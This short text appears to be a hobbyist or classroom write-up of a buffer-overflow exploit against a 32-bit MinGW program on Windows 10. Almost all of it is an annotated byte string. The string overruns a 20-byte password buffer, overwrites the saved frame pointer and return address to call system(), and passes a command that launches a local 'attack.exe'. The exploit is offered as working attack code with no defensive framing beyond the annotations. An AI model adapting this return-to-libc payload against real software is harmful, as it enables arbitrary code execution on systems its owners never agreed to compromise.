I ran this exploit on 32-bit MinGW, GCC 6.3.0, on Windows 10. It calls system() to transfer control to another program in the same directory called "attack.exe"


/* exploit string, annotated */

/* 20 bytes allocated for password */
61 61 61 61 
61 61 61 61 
61 61 61 61 
61 61 61 61 
61 61 61 61 

/* saved %ebp of main (written in again) */
38 FF 61 00 

/* address of system() */
10 3B F2 74 

/* address to return to main */
D8 14 40 00 

/* pointer to command string */
18 FF 61 00 

/* contents of command string: ".\\attack" (gets replaces newline with null */
2E 5C 61 74 74 61 63 6B 0A


/* full exploit string */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 38 FF 61 00 10 3B F2 74 D8 14 40 00 18 FF 61 00 2E 5C 61 74 74 61 63 6B 0A